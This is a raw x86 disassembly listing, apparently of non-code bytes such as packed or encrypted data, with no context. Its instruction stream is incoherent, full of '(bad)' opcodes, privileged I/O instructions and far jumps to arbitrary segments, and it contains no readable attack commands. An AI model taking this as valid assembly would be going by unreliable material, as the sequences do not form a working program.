  4382a8:	jno    0x43830d
  4382aa:	push   cs
  4382ab:	or     al,bl
  4382ad:	add    DWORD PTR [esi+0x5df8d91e],ebx
  4382b3:	fidiv  DWORD PTR [esi]
  4382b5:	fisub  DWORD PTR [edx-0x6ebd8e4f]
  4382bb:	gs int 0x4d
  4382be:	mov    DWORD PTR [eax+0x41346e1],esp
  4382c4:	adc    esi,ebx
  4382c6:	mov    ah,0x76
  4382c8:	retf   
  4382c9:	cli    
  4382ca:	adc    al,0xed
  4382cc:	sub    BYTE PTR [eax+0x16],0xb7
  4382d0:	in     eax,0xcc
  4382d2:	and    al,bl
  4382d4:	mov    dh,0x4d
  4382d6:	mov    ah,0xfc
  4382d8:	rcl    BYTE PTR [ebx+0x59],cl
  4382db:	retf   
  4382dc:	pop    ss
  4382dd:	mov    DWORD PTR [ebx],ecx
  4382df:	or     esp,ebp
  4382e1:	int    0x5b
  4382e3:	stc    
  4382e4:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4382e6:	pop    ebx
  4382e7:	mov    BYTE PTR [ebx+0x4169454a],al
  4382ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4382ee:	mov    DWORD PTR [edi+0x6d516b71],0xc2339b7d
  4382f8:	sbb    al,ah
  4382fa:	cs mov al,0x35
  4382fd:	adc    DWORD PTR [edi-0x12],edx
  438300:	or     BYTE PTR [esi],dl
  438302:	imul   esi,DWORD PTR [ecx],0x1b055c7
  438308:	ror    DWORD PTR [ebp+0x2f],1
  43830b:	adc    ebp,DWORD PTR [esi-0x24ca9200]
  438311:	test   al,0x3a
  438313:	out    0x1c,eax
  438315:	dec    edx
  438316:	fisub  DWORD PTR [eax+0x7]
  438319:	vpmullw ymm1,ymm6,YMMWORD PTR [edi]
  43831d:	and    ch,BYTE PTR [ebx-0x1a]
  438320:	jecxz  0x4382b8
  438322:	sbb    dh,BYTE PTR [ecx-0x454a01ab]
  438328:	or     BYTE PTR [edi+0x704da294],cl
  43832e:	fstp   TBYTE PTR [ebx]
  438330:	inc    eax
  438331:	dec    edx
  438332:	lods   eax,DWORD PTR ds:[esi]
  438333:	cli    
  438334:	push   eax
  438335:	xor    BYTE PTR [edi],dh
  438337:	ins    DWORD PTR es:[edi],dx
  438338:	pop    ebp
  438339:	fisubr DWORD PTR [eax-0x6a]
  43833c:	jae    0x4383a1
  43833e:	push   0x1a
  438340:	mov    BYTE PTR [eax+0x2b],bl
  438343:	inc    eax
  438344:	or     ah,BYTE PTR [edx+0x4d8f145d]
  43834a:	loope  0x438324
  43834c:	test   al,0x1a
  43834e:	ins    BYTE PTR es:[edi],dx
  43834f:	(bad)  [edx-0x30]
  438352:	dec    ebp
  438353:	sbb    al,0xc8
  438355:	add    BYTE PTR [eax+ebp*4-0x75],bl
  438359:	adc    esi,ecx
  43835b:	ret    0x4a35
  43835e:	stos   BYTE PTR es:[edi],al
  43835f:	outs   dx,BYTE PTR ds:[esi]
  438360:	pop    ebx
  438361:	add    edi,DWORD PTR [esi-0x703591b8]
  438367:	into   
  438368:	add    edx,DWORD PTR [ebp-0x30]
  43836b:	lods   eax,DWORD PTR ds:[esi]
  43836c:	cs jmp 0xea3:0x71a670c1
  438374:	stos   BYTE PTR es:[edi],al
  438375:	fsubr  DWORD PTR [edi]
  438377:	xor    BYTE PTR [ebp-0x7a77270d],dl
  43837d:	scas   al,BYTE PTR es:[edi]
  43837e:	mov    BYTE PTR [ebp-0x313ea931],ch
  438384:	pop    ds
  438385:	and    eax,0xd414d88a
  43838a:	dec    dh
  43838c:	daa    
  43838d:	pusha  
  43838e:	stos   BYTE PTR es:[edi],al
  43838f:	(bad)  
  438390:	push   ebp
  438391:	sub    eax,0xf78cd86c
  438396:	shl    ebx,cl
  438398:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438399:	in     al,dx
  43839a:	mov    DWORD PTR ds:0xf4c50adc,eax
  4383a0:	mov    bh,0xfb
  4383a2:	adc    al,0x79
  4383a4:	mov    ch,0xa9
  4383a6:	mov    cl,BYTE PTR [ebp+0x73]
  4383a9:	dec    ebx
  4383aa:	arpl   WORD PTR [edx+edi*2],si
  4383ad:	daa    
  4383ae:	cmp    BYTE PTR [eax-0x4365bf8b],0xc2
  4383b5:	ss dec edi
  4383b7:	sbb    eax,0x636b7514
  4383bc:	xchg   BYTE PTR [ebx+0x33],ch
  4383bf:	scas   al,BYTE PTR es:[edi]
  4383c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4383c1:	push   ds
  4383c2:	fnsave [esi+0x7dafa826]
  4383c8:	scas   al,BYTE PTR es:[edi]
  4383c9:	jecxz  0x43838f
  4383cb:	imul   edi,DWORD PTR [eax+0x17545bea],0x0
  4383d2:	mov    edi,0xba760c32
  4383d7:	aad    0x5
  4383d9:	add    eax,0xa3737849
  4383de:	lds    edx,FWORD PTR [eax]
  4383e0:	dec    edi
  4383e1:	in     eax,dx
  4383e2:	cmp    BYTE PTR [esi+0x12],0x2e
  4383e6:	mov    cl,0x8e
  4383e8:	add    eax,DWORD PTR ds:0x53ba56b7
  4383ee:	mov    bh,0x1d
  4383f0:	push   esp
  4383f1:	call   0x6d14:0xaf5bb62a
  4383f8:	jg     0x4383c8
  4383fa:	sub    BYTE PTR [eax+0x51],dh
  4383fd:	aam    0x51
  4383ff:	adc    al,0x37
  438401:	loope  0x438445
  438403:	or     ah,ah
  438405:	xor    bl,bl
  438407:	push   edx
  438408:	popa   
  438409:	mov    ebx,0x6bc4651d
  43840e:	pop    es
  43840f:	add    DWORD PTR [edi-0x2a],eax
  438412:	push   0xa26dad9a
  438417:	mov    dh,BYTE PTR [edx-0x7d]
  43841a:	fwait
  43841b:	adc    bh,BYTE PTR [edx-0x50]
  43841e:	or     BYTE PTR ds:0x66f4db45,0xb3
  438425:	xor    al,0x9b
  438427:	add    BYTE PTR [edi],0xb
  43842a:	fisttp DWORD PTR [ebp-0x394e967a]
  438430:	mov    ch,0xad
  438432:	into   
  438433:	mov    ebx,0x5b2e1a5e
  438438:	adc    eax,DWORD PTR [ecx+ecx*4+0x17]
  43843c:	pop    edi
  43843d:	imul   ecx
  43843f:	(bad)  
  438440:	push   ss
  438441:	cmp    ch,BYTE PTR [eax]
  438443:	push   ss
  438444:	test   DWORD PTR [ebp-0x7],esp
  438447:	jnp    0x438425
  438449:	(bad)  
  43844a:	fist   DWORD PTR ds:0x6e05db75
  438450:	mov    esp,0xfd303de0
  438455:	inc    ecx
  438456:	out    0x6,al
  438458:	stos   BYTE PTR es:[edi],al
  438459:	mov    dh,0x5b
  43845b:	bound  ebp,QWORD PTR [esi+0x30f2d174]
  438461:	test   al,0xad
  438463:	mov    DWORD PTR [ebp-0x653fe647],eax
  438469:	mov    ch,bl
  43846b:	jmp    0x16bf:0x3b41436
  438472:	jno    0x438439
  438474:	cmp    DWORD PTR [eax],0x53
  438477:	inc    eax
  438478:	ins    BYTE PTR es:[edi],dx
  438479:	mov    BYTE PTR [ebp+0x6d7e3034],dh
  43847f:	fwait
  438480:	sbb    BYTE PTR [ebx-0x4d],0xa4
  438484:	xchg   ecx,esi
  438486:	out    0xb8,eax
  438488:	test   edx,ebx
  43848a:	lock test DWORD PTR [esi],eax
  43848d:	rol    DWORD PTR [eax-0x46],1
  438490:	jl     0x438422
  438492:	mov    gs,WORD PTR [ebp-0x723eb8b0]
  438498:	hlt    
  438499:	lock test BYTE PTR [edi-0x16],bl
  43849d:	sub    eax,0x3f440df1
  4384a2:	add    bl,BYTE PTR [edi-0xb98c300]
  4384a8:	cmp    bl,BYTE PTR [ebx+0x6b]
  4384ab:	add    eax,DWORD PTR [ecx-0x1d]
  4384ae:	xor    eax,esi
  4384b0:	or     al,BYTE PTR [edx]
  4384b2:	dec    edi
  4384b3:	call   0xd116:0xb7856e8a
  4384ba:	or     al,0xe4
  4384bc:	fadd   DWORD PTR [eax+0x2d]
  4384bf:	ins    BYTE PTR es:[edi],dx
  4384c0:	pop    ss
  4384c1:	push   ss
  4384c2:	push   ss
  4384c3:	or     dh,BYTE PTR [bx+di]
  4384c6:	jmp    0xb610d2eb
  4384cb:	sbb    ch,BYTE PTR [edx]
  4384cd:	jbe    0x4384cf
  4384cf:	jbe    0x438528
  4384d1:	int    0xa2
  4384d3:	sub    ecx,DWORD PTR [ebx]
  4384d5:	mov    edx,0xc3d8aa51
  4384da:	out    0xe7,eax
  4384dc:	imul   eax,DWORD PTR [esi],0x68
  4384df:	add    DWORD PTR [edx+0x4ab1e220],ebp
  4384e5:	and    al,bl
  4384e7:	push   ecx
  4384e8:	shl    DWORD PTR [ebp-0x31],1
  4384eb:	xor    BYTE PTR [eax],bl
  4384ed:	lds    ecx,FWORD PTR [eax+0x40ed101d]
  4384f3:	fisubr DWORD PTR [edi+0x5165a954]
  4384f9:	pop    es
  4384fa:	add    al,0x6d
  4384fc:	sub    bl,BYTE PTR [edx+0x7c85ea55]
  438502:	imul   ecx,DWORD PTR [ebx-0x492b8040],0x76
  438509:	cmp    BYTE PTR [eax],al
  43850b:	repnz push eax
  43850d:	push   edx
  43850e:	push   ebx
  43850f:	shl    DWORD PTR [esi-0x430a2234],0x62
  438516:	and    ah,al
  438518:	push   esi
  438519:	outs   dx,BYTE PTR ds:[esi]
  43851a:	(bad)  [edx]
  43851c:	repnz adc DWORD PTR [esi*2-0x48eecdeb],0x781addb6
  438528:	mov    dh,0x2e
  43852a:	scas   al,BYTE PTR es:[edi]
  43852b:	sub    al,0xbc
  43852d:	sti    
  43852e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43852f:	dec    edi
  438530:	xchg   DWORD PTR [edx-0x79afbc98],ebp
  438536:	je     0x4384cf
  438538:	mov    bh,0x85
  43853a:	ins    DWORD PTR es:[edi],dx
  43853b:	jmp    0x4384e6
  43853d:	call   0x8297:0x8dbc06cb
  438544:	and    ecx,DWORD PTR [eax+0x346e361d]
  43854a:	inc    eax
  43854b:	jp     0x438582
  43854d:	adc    eax,0xb23fa98c
  438552:	inc    ecx
  438553:	je     0x4384f6
  438555:	xchg   DWORD PTR [edx+0xd280e44],edx
  43855b:	mov    al,ds:0x1976d6ea
  438560:	cli    
  438561:	jge    0x43852b
  438563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438564:	push   edx
  438565:	imul   eax,DWORD PTR [edi],0xf8e8182e
  43856b:	in     al,0xfc
  43856d:	pop    esi
  43856e:	adc    al,al
  438570:	add    esp,DWORD PTR [ebx-0x172546f4]
  438576:	es clc 
  438578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438579:	aam    0xab
  43857b:	mov    dh,0x2d
  43857d:	rcl    BYTE PTR [edx-0x26],1
  438580:	sub    dh,BYTE PTR [edi+0xc]
  438583:	adc    al,0x8a
  438585:	pop    ecx
  438586:	and    eax,0xbfb7538a
  43858b:	hlt    
  43858c:	mov    WORD PTR [esi+0x161751f2],ss
  438592:	mov    dh,0xe3
  438594:	stos   BYTE PTR es:[edi],al
  438595:	out    0xa9,al
  438597:	fild   QWORD PTR [eax]
  438599:	into   
  43859a:	inc    esi
  43859b:	fwait
  43859c:	add    al,bl
  43859e:	inc    ecx
  43859f:	add    ebx,DWORD PTR [esi+0x19]
  4385a2:	xor    al,0xb2
  4385a4:	mov    esi,0x5051d12d
  4385a9:	ss hlt 
  4385ab:	jae    0x438611
  4385ad:	cwde   
  4385ae:	push   0xffffffa8
  4385b0:	mov    edx,0xcdae901d
  4385b5:	(bad)  
  4385b8:	les    esp,FWORD PTR [ebp+0x1ce60402]
  4385be:	cwde   
  4385bf:	inc    esp
  4385c0:	push   ss
  4385c1:	mov    ebx,0xbda56e22
  4385c6:	lds    edi,FWORD PTR es:[ebx-0x6386a7a]
  4385cd:	or     DWORD PTR [edx-0x21afbff3],0x5c
  4385d4:	data16 or BYTE PTR [esi],dh
  4385d7:	shl    DWORD PTR [esi-0x7fc7a287],0x2f
  4385de:	out    dx,al
  4385df:	je     0x4385b9
  4385e1:	adc    al,0x75
  4385e3:	imul   ebp,DWORD PTR [ebp-0x9ceac0d],0xffffffdc
  4385ea:	cdq    
  4385eb:	pop    es
  4385ec:	mov    ah,0x80
  4385ee:	push   cs
  4385ef:	sub    ch,ch
  4385f1:	addr16 sub bl,ah
  4385f4:	sbb    ah,BYTE PTR [edx+0x507d186e]
  4385fa:	test   BYTE PTR [edx+0x50],dh
  4385fd:	not    BYTE PTR [esi-0x7f]
  438600:	test   al,0x1d
  438602:	add    DWORD PTR [eax+eiz*8-0x14],edi
  438606:	dec    edi
  438607:	fst    QWORD PTR [esi+0x32ecadda]
  43860d:	dec    eax
  43860e:	jne    0x4385ab
  438610:	push   esi
  438611:	mov    cl,0xec
  438613:	and    al,0x14
  438615:	pop    esp
  438616:	clc    
  438617:	fiadd  DWORD PTR [eax-0xd]
  43861a:	(bad)  
  43861b:	scas   al,BYTE PTR es:[edi]
  43861c:	xor    eax,ebp
  43861e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43861f:	adc    eax,0x7500a39a
  438624:	add    BYTE PTR [eax+edi*8],ah
  438627:	loopne 0x4386a1
  438629:	mov    eax,0xfc637cb4
  43862e:	leave  
  43862f:	nop
  438630:	pop    ss
  438631:	add    BYTE PTR [edx+edi*2+0x477e77bf],ah
  438638:	jne    0x438665
  43863a:	pop    edi
  43863b:	jae    0x4385ea
  43863d:	add    BYTE PTR [ebp+0x20c1f80f],bh
  438643:	add    al,0x70
  438645:	jmp    0x4385e9
  438647:	pusha  
  438648:	push   edi
  438649:	dec    edx
  43864a:	add    ecx,edx
  43864c:	cmc    
  43864d:	ins    BYTE PTR es:[edi],dx
  43864e:	dec    esp
  43864f:	sub    al,0x4
  438651:	xor    al,0x40
  438653:	push   0xaaf896a1
  438658:	sbb    BYTE PTR ds:0xbfb06451,0x0
  43865f:	jbe    0x438675
  438661:	ins    DWORD PTR es:[edi],dx
  438662:	sbb    DWORD PTR [eax],esi
  438664:	xchg   esp,eax
  438665:	mov    cs,WORD PTR [ecx+0x36176cf4]
  43866b:	mov    edx,0xede48d52
  438670:	rcl    eax,0x60
  438673:	mov    cs,WORD PTR es:[eax]
  438676:	outs   dx,BYTE PTR ds:[esi]
  438677:	pop    ebp
  438678:	push   ebp
  438679:	xor    edx,esp
  43867b:	pop    edi
  43867c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43867d:	ins    BYTE PTR es:[edi],dx
  43867e:	mov    ds:0x2fa68bad,al
  438683:	in     eax,0x48
  438685:	sbb    eax,0x4535c56b
  43868a:	sub    al,0x6c
  43868c:	push   esp
  43868d:	es popf 
  43868f:	test   DWORD PTR [edi],ecx
  438691:	push   esp
  438692:	mov    WORD PTR [ebx-0x58d125f6],ds
  438698:	push   cs
  438699:	(bad)  
  43869a:	push   esi
  43869b:	inc    ebp
  43869c:	dec    eax
  43869d:	ss pop edi
  43869f:	test   edx,ecx
  4386a1:	inc    esp
  4386a2:	ins    DWORD PTR es:[edi],dx
  4386a3:	or     BYTE PTR [eax+0x768adacd],ah
  4386a9:	inc    esp
  4386aa:	rcr    BYTE PTR [esi-0x2f],0x85
  4386ae:	and    ecx,ebp
  4386b0:	adc    ch,dl
  4386b2:	shr    BYTE PTR [esi],cl
  4386b4:	mov    esp,0x8f0ea1f9
  4386b9:	cmp    eax,0x537540b5
  4386be:	dec    esi
  4386bf:	pushf  
  4386c0:	pusha  
  4386c1:	aas    
  4386c2:	xchg   edi,eax
  4386c3:	in     eax,dx
  4386c4:	sub    ah,BYTE PTR [edx-0x45]
  4386c7:	jge    0x438711
  4386c9:	push   ebx
  4386ca:	das    
  4386cb:	or     al,0xd9
  4386cd:	outs   dx,DWORD PTR ds:[esi]
  4386ce:	loop   0x4386a5
  4386d0:	mov    fs,WORD PTR [eax]
  4386d2:	shl    DWORD PTR ds:[edi+0x54b198ff],1
  4386d9:	mov    bh,0x86
  4386db:	mov    eax,0xec7c2275
  4386e0:	xchg   ebx,eax
  4386e1:	sbb    eax,0x7e5f30e1
  4386e6:	adc    BYTE PTR [ecx],al
  4386e8:	ins    DWORD PTR es:[edi],dx
  4386e9:	pop    ebp
  4386ea:	add    BYTE PTR [eax+0x6e5eb64a],ah
  4386f0:	pop    ebx
  4386f1:	inc    ebx
  4386f2:	mov    al,0xe5
  4386f4:	test   DWORD PTR [edx+0x7e],ecx
  4386f7:	fiadd  DWORD PTR [ebx+0x35]
  4386fa:	outs   dx,BYTE PTR ds:[esi]
  4386fb:	fisttp DWORD PTR [eax+0x3d2a6a25]
  438701:	push   edi
  438702:	cld    
  438703:	mov    bl,0x71
  438705:	popa   
  438706:	mov    ds:0x4bb02bab,eax
  43870b:	jb     0x4386bc
  43870d:	inc    eax
  43870e:	mov    ebp,0x4360026d
  438713:	daa    
  438714:	pop    ebp
  438715:	call   0x85c2:0xd1fb3158
  43871c:	mov    dh,0xa7
  43871e:	lods   eax,DWORD PTR ds:[esi]
  43871f:	loopne 0x438761
  438721:	add    ecx,DWORD PTR [ebp+0x43]
  438724:	dec    eax
  438725:	cs mov eax,0x8d0441d0
  43872b:	push   0x16
  43872d:	int3   
  43872e:	push   ss
  43872f:	pusha  
  438730:	pop    es
  438731:	inc    ecx
  438732:	mov    bh,0x70
  438734:	pop    ss
  438735:	cs (bad) 
  438737:	lods   eax,DWORD PTR ds:[esi]
  438738:	imul   edx,DWORD PTR [ecx],0x44
  43873b:	aaa    
  43873c:	call   0xb861:0xd8a5cbaa
  438743:	mov    ds:0xc51da596,al
  438748:	pop    ds
  438749:	adc    ebp,esp
  43874b:	pop    ds
  43874c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43874d:	or     esp,DWORD PTR [ebp+0x680503a2]
  438753:	jbe    0x4387a7
  438755:	dec    ebp
  438756:	ins    DWORD PTR es:[edi],dx
  438757:	popa   
  438758:	sub    eax,DWORD PTR [ecx-0x58]
  43875b:	fiadd  DWORD PTR [edx]
  43875d:	jns    0x43871a
  43875f:	or     BYTE PTR [ebx],dl
  438761:	push   ecx
  438762:	fild   DWORD PTR [ebp+0x567aac19]
  438768:	mov    ecx,ecx
  43876a:	mov    esp,0x6080e8db
  43876f:	add    ebx,DWORD PTR [edx]
  438771:	or     eax,0xcb0b5135
  438776:	mov    cl,BYTE PTR ds:0xb2bf7411
  43877c:	aas    
  43877d:	and    al,0x28
  43877f:	dec    ebp
  438780:	adc    DWORD PTR [ebx+ebp*4-0x7499e897],esi
  438787:	out    0xa6,al
  438789:	mov    al,ds:0x5190b6e
  43878e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43878f:	jb     0x4387ce
  438791:	test   BYTE PTR [eax],al
  438793:	push   0x7
  438795:	lds    esp,FWORD PTR [ebx-0x3f]
  438798:	(bad)  
  438799:	cwde   
  43879a:	jbe    0x438805
  43879c:	add    eax,DWORD PTR [ebp-0x65]
  43879f:	outs   dx,BYTE PTR ds:[esi]
  4387a0:	not    BYTE PTR [edx+0x20d7fb86]
  4387a6:	inc    esp
  4387a7:	in     eax,dx
  4387a8:	mov    BYTE PTR [edx+0x45],ah
  4387ab:	add    ecx,ebp
  4387ad:	pop    edi
  4387ae:	fild   DWORD PTR [esi]
  4387b0:	push   0x7
  4387b2:	cmp    edx,DWORD PTR ds:0xd391ffab
  4387b8:	adc    DWORD PTR [eax+0x555d6d11],ebx
  4387be:	push   ss
  4387bf:	loope  0x4387d5
  4387c1:	bound  eax,QWORD PTR [edx-0x1e93ffe3]
  4387c7:	mov    ds:0x62c54a1d,eax
  4387cc:	add    DWORD PTR [edx+0x361450a1],esp
  4387d2:	add    BYTE PTR [ecx-0x40],0x85
  4387d6:	cs int 0xa5
  4387d9:	mov    ds:0xb83c2821,eax
  4387de:	rcr    al,1
  4387e0:	fdivr  DWORD PTR [ecx-0x4e358adf]
  4387e6:	stc    
  4387e7:	or     ebp,DWORD PTR [eax+eax*1-0x46]
  4387eb:	add    eax,0xbffac07b
  4387f0:	mov    eax,ds:0x6028e893
  4387f5:	add    esp,DWORD PTR ds:0x259251df
  4387fb:	and    dl,0xb7
  4387fe:	pop    ebp
  4387ff:	les    edx,FWORD PTR [ebp-0x56]
  438802:	inc    edi
  438803:	jnp    0x43884f
  438805:	loope  0x43883a
  438807:	ins    DWORD PTR es:[edi],dx
  438808:	test   eax,0xea646db4
  43880d:	jo     0x4387cb
  43880f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438810:	xor    al,BYTE PTR [ecx+0x1a]
  438813:	xor    al,BYTE PTR [esi]
  438815:	push   esp
  438816:	or     bl,dl
  438818:	xchg   esi,eax
  438819:	hlt    
  43881a:	ret    0x1c81
  43881d:	fst    QWORD PTR [esi]
  43881f:	push   0xffffffb7
  438821:	aam    0x8e
  438823:	in     al,0xaa
  438825:	imul   ecx,DWORD PTR [edx+0x804610b],0xffffffb6
  43882c:	add    eax,0x6a9dcea2
  438831:	cmp    BYTE PTR [edi+0x76],ch
  438834:	adc    BYTE PTR [eax+0x659e1b23],dh
  43883a:	inc    edx
  43883b:	inc    edi
  43883c:	mov    al,ds:0x826b7540
  438841:	lock mov ah,0xf2
  438844:	jg     0x438864
  438846:	shr    BYTE PTR [ebp-0x5d],0x7d
  43884a:	addr16 int3 
  43884c:	xchg   dl,dl
  43884e:	in     eax,0xe0
  438850:	lds    ebp,FWORD PTR [edx+ecx*1-0x4db2f47e]
  438857:	inc    esi
  438858:	sar    edi,0xbc
  43885b:	imul   ebp,DWORD PTR [ebx+0x2b],0x64cc8c6c
  438862:	fnstenv [esi+0x718b3126]
  438868:	adc    eax,0x4f686b5a
  43886d:	mov    al,0x4c
  43886f:	push   eax
  438870:	mov    eax,ds:0x135ba29f
  438875:	inc    ebp
  438876:	je     0x4388ce
  438878:	inc    edi
  438879:	cmp    esp,DWORD PTR [ebx-0x26]
  43887c:	lea    esi,[esi-0x615c42d5]
  438882:	cmp    DWORD PTR [ebp+0x6b3850f0],0x17
  438889:	adc    ah,bl
  43888b:	into   
  43888c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43888d:	sub    ecx,0x372e9502
  438893:	cmp    al,BYTE PTR [eax+0x41281a60]
  438899:	(bad)  
  43889a:	jae    0x438836
  43889c:	test   DWORD PTR [edx+0x57],eax
  43889f:	adc    BYTE PTR [eax+ebx*2-0x291d66ed],al
  4388a6:	add    DWORD PTR [ecx],eax
  4388a8:	clc    
  4388a9:	lds    si,DWORD PTR [ecx-0x4fba892f]
  4388b0:	adc    DWORD PTR [esi-0x464d52ab],0xffffffce
  4388b7:	add    ah,BYTE PTR [edx+0x56ff0809]
  4388bd:	bound  esp,QWORD PTR [ebx+0x25a15a23]
  4388c3:	adc    eax,0xa08fe1b2
  4388c8:	fcomp  DWORD PTR [edx-0x2dc82726]
  4388ce:	inc    esi
  4388cf:	push   0xb6d144f2
  4388d4:	in     eax,dx
  4388d5:	fcmovnbe st,st(3)
  4388d7:	add    edi,DWORD PTR [eax]
  4388d9:	mov    al,0x68
  4388db:	es rcl esp,1
  4388de:	mov    dh,0x35
  4388e0:	hlt    
  4388e1:	and    ebp,edi
  4388e3:	ds add eax,0xb6d4482a
  4388e9:	mov    ch,0x1d
  4388eb:	add    eax,0xe00968aa
  4388f0:	inc    esp
  4388f1:	or     eax,0xe8a26a92
  4388f6:	ret    0x1cd6
  4388f9:	adc    BYTE PTR [edx],cl
  4388fb:	pushf  
  4388fc:	push   ss
  4388fd:	push   0xa9dc0103
  438902:	xor    ebx,DWORD PTR [esi+eiz*8-0x78]
  438906:	or     ebp,DWORD PTR cs:0x331c226a
  43890d:	jp     0x4388f7
  43890f:	cwde   
  438910:	cmp    eax,0x8e8aa06c
  438915:	loop   0x43889a
  438917:	inc    esi
  438918:	sbb    DWORD PTR [ebx],esp
  43891a:	rol    DWORD PTR [esi],0x28
  43891d:	cs shl ebx,1
  438920:	push   edx
  438921:	xor    esp,DWORD PTR [esi*2+0x4576021a]
  438928:	cmp    al,0x2e
  43892a:	lds    esi,FWORD PTR [esp+ebx*2-0x24975040]
  438931:	pop    ss
  438932:	(bad)  
  438933:	shl    al,cl
  438935:	inc    esi
  438936:	daa    
  438937:	mov    edx,0x1761616
  43893c:	dec    esp
  43893d:	aas    
  43893e:	(bad)  
  43893f:	jmp    0x438913
  438941:	icebp  
  438942:	and    eax,0x886dad85
  438947:	or     bl,BYTE PTR [edx]
  438949:	sub    eax,0x1c88ad83
  43894e:	dec    ebx
  43894f:	dec    ebx
  438950:	pop    ebp
  438951:	rol    BYTE PTR [ebx],0xa6
  438954:	stos   DWORD PTR es:[edi],eax
  438955:	pop    esp
  438956:	sahf   
  438957:	test   dl,0x19
  43895a:	add    al,0x1b
  43895c:	mov    ebx,0x52562482
  438961:	inc    ecx
  438962:	nop
  438963:	xchg   edx,eax
  438964:	call   0x14e0:0x9536d880
  43896b:	or     edi,DWORD PTR ds:0x56e2c5da
  438971:	or     BYTE PTR [esi],dh
  438973:	add    edi,DWORD PTR [edi-0x3761619b]
  438979:	mov    dh,0xad
  43897b:	mov    al,ds:0x772b9f0b
  438980:	sbb    dh,cl
  438982:	jp     0x43895e
  438984:	test   DWORD PTR [esi-0x4c],edx
  438987:	pop    es
  438988:	test   al,0x79
  43898a:	mov    DWORD PTR [edi-0x4a4a472f],esi
  438990:	mov    al,ds:0x130c685b
  438995:	rol    dl,0xb6
  438998:	jbe    0x43893b
  43899a:	sub    DWORD PTR [edx-0x10a47771],ecx
  4389a0:	inc    ecx
  4389a1:	mov    WORD PTR [ebx+ecx*1-0x5ce8aee3],ds
  4389a8:	pop    ds
  4389a9:	xor    dl,al
  4389ab:	xchg   ecx,eax
  4389ac:	mov    dl,0xf7
  4389ae:	ror    BYTE PTR [esi],1
  4389b0:	stos   BYTE PTR es:[edi],al
  4389b1:	mov    dh,0xb2
  4389b3:	pop    ss
  4389b4:	clc    
  4389b5:	xchg   dh,bl
  4389b7:	inc    esp
  4389b8:	stos   BYTE PTR es:[edi],al
  4389b9:	mov    eax,0x67be0435
  4389be:	mov    DWORD PTR [ebp-0x5e892f7c],edi
  4389c4:	in     eax,dx
  4389c5:	aad    0x72
  4389c7:	retf   0xd53
  4389ca:	push   0xfffffff4
  4389cc:	mov    eax,ds:0x5b808e57
  4389d1:	push   edi
  4389d2:	hlt    
  4389d3:	mov    ch,0x9e
  4389d5:	sub    eax,DWORD PTR [ecx+ebp*8]
  4389d8:	adc    BYTE PTR [edx*1+0x7c5d86c4],dh
  4389df:	xor    al,dl
  4389e1:	add    DWORD PTR [eax-0x5d],esi
  4389e4:	add    eax,0x2d9ed248
  4389e9:	adc    ebp,DWORD PTR [ebp+0xb]
  4389ec:	inc    eax
  4389ed:	mov    ebx,0xb6ecdd64
  4389f2:	xchg   esi,eax
  4389f3:	cmova  edx,DWORD PTR [esi-0x61]
  4389f7:	fcom   DWORD PTR [esi*4-0x289e3bad]
  4389fe:	inc    esp
  4389ff:	inc    ebx
  438a00:	and    cl,dl
  438a02:	test   eax,0x5805d801
  438a07:	out    dx,eax
  438a08:	loopne 0x438a4c
  438a0a:	push   0xffffff9b
  438a0c:	push   ebx
  438a0d:	lods   eax,DWORD PTR ds:[esi]
  438a0e:	mov    ds:0x7af99f76,al
  438a13:	pop    ecx
  438a14:	fcom   DWORD PTR [edx-0x7]
  438a17:	ror    BYTE PTR ds:0xd118a600,cl
  438a1d:	sub    DWORD PTR [eax],eax
  438a1f:	mov    ch,0xaa
  438a21:	fwait
  438a22:	and    eax,0x4de08ba0
  438a27:	xor    al,0x80
  438a29:	iret   
  438a2a:	test   eax,0x85a2a8e8
  438a2f:	pushf  
  438a30:	cli    
  438a31:	sub    ah,BYTE PTR [edi-0x55]
  438a34:	push   esi
  438a35:	rcl    DWORD PTR [esi-0x7f],0x1c
  438a39:	ins    DWORD PTR es:[edi],dx
  438a3a:	push   esp
  438a3b:	retf   0x46e2
  438a3e:	push   edi
  438a3f:	shr    DWORD PTR [esi],0xd9
  438a42:	xchg   BYTE PTR [edi+0x57558ccc],dh
  438a48:	lds    ebp,FWORD PTR [esi]
  438a4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438a4b:	lock push 0x9750fcb4
  438a51:	fiadd  DWORD PTR [esi]
  438a53:	push   ss
  438a54:	jg     0x4389d6
  438a56:	jp     0x438ac6
  438a58:	in     al,dx
  438a59:	in     al,dx
  438a5a:	mov    ds:0xfb811760,al
  438a5f:	jmp    0x4d6e:0x2f97c35d
  438a66:	add    eax,esi
  438a68:	rol    DWORD PTR [edi+ebp*4-0x52],cl
  438a6c:	sub    ebp,DWORD PTR ss:[edx-0x5fb92af3]
  438a73:	xchg   ebp,eax
  438a74:	push   eax
  438a75:	pop    ss
  438a76:	int    0x1a
  438a78:	xor    BYTE PTR [esi-0x41c7316a],0x7f
  438a7f:	pop    edx
  438a80:	stos   BYTE PTR es:[edi],al
  438a81:	bound  eax,QWORD PTR [edi-0x24]
  438a84:	push   cs
  438a85:	pop    esi
  438a86:	or     BYTE PTR [ebx],0xa2
  438a89:	repz (bad) [esi+0x5b]
  438a8d:	push   0xa09490a9
  438a92:	and    ebp,DWORD PTR [ecx]
  438a94:	shr    DWORD PTR [ecx],0xf8
  438a97:	clc    
  438a98:	lock push ebp
  438a9a:	shl    DWORD PTR [esi+0x6b],0x1d
  438a9e:	loopne 0x438ae7
  438aa0:	fadd   QWORD PTR [edi-0x54]
  438aa3:	(bad)  
  438aa4:	add    eax,0x9617f4b0
  438aa9:	jge    0x438b14
  438aab:	call   0x4af359e
  438ab0:	mov    ah,0xdb
  438ab2:	mov    WORD PTR [ebp-0x42],cs
  438ab5:	popa   
